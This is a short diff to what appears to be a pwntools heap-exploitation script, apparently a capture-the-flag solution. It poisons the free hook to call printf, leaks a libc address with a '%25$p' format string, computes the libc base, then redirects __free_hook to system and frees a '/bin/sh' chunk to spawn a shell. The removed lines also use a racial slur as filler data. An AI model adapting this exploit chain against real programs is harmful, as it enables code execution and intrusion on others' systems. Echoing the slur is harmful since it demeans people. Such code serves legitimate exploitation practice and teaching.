@@ -33,19 +33,19 @@ free()
 free()
 
 malloc(b'20', p64(old_free_hook))
-malloc(b'20', b'nigga')
+malloc(b'20', b'bbbb')
 malloc(b'20', p64(printf_plt))
 malloc(b'20', b'%25$p')
 free()
 
 libc_start_main = int(io.recvuntil(b"==", drop=True), 0) 
-libc.address = libc_start_main - 621607
+libc.address = libc_start_main - 0x97c27
 log.info(f'libc base: {hex(libc.address)}')
 
 system = libc.sym.system
 
 malloc(b"30", p64(__free_hook))
-malloc(b"30", b"nigga2")
+malloc(b"30", b"cccc")
 malloc(b"30", p64(system))
 
 malloc(b"20", b"/bin/sh")
